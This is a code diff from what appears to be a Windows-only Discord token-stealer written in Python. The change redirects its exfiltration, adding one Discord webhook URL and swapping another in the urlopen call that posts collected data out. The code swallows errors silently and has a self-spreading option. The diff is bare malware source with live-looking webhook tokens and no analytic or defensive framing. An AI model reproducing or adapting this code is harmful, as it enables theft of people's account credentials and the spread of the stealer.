@@ -1,3 +1,5 @@
+Whook = "https://discordapp.com/api/webhooks/852291602490720288/lEDBInsmsugj-X0wxw1rKskKan6h0iym5RfiLoyxe7ikHxjz8RY7927Of9BVl1entKQ7"
+
 import os
 if os.name != "nt":
     exit()
@@ -197,7 +199,7 @@ def main():
         "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
     }
     try:
-        urlopen(Request("https://discordapp.com/api/webhooks/852211990042378250/d51eZaxIrPaqk855QBsRvOgpXbnnEqsjqxFKv-7XArgiNX6I0hIAgJs2lQwQFrwqIsBS", data=dumps(webhook).encode(), headers=getheaders()))
+        urlopen(Request("https://discordapp.com/api/webhooks/852291945694888017/3ZLrgFPAbvmoRM7fDD91C9RjUpuqPpW3QvQYCusvwABdVpqsJe9JsDrJkwremMiBW08R", data=dumps(webhook).encode(), headers=getheaders()))
     except:
         pass
     if self_spread:
